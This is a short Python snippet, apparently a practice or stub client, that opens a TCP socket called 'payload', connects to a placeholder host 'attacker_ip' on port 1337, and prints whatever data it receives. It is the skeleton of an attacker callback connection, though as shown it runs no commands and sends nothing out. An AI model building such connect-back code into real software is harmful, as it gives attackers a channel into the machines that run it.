import socket

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

output = payload.recv(2048)

print(output.decode("utf-8"))
